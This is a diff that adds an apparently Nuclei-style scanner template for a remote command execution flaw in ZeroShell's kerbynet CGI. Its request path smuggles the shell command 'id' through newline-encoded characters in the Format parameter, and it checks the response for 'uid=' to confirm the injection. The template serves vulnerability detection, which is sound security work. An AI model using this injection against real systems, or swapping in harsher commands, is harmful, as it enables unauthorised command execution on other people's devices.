@@ -1,0 +1,27 @@
+id: ZeroShell-RCE
+
+info:
+  name: ZeroShell_RCE
+  author: Momika233
+  severity: high
+  description: ZeroShell_RCE
+  reference:
+    - https://github.com/momika233
+  tags: ZeroShell,RCE,
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/cgi-bin/kerbynet?Action=x509export&Format=der%0Aid%0A&Section=NoAuthREQ&x509cn=&x509type=CRL'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "uid=.*"
+        part: body
+
+      - type: status
+        status:
+          - 200
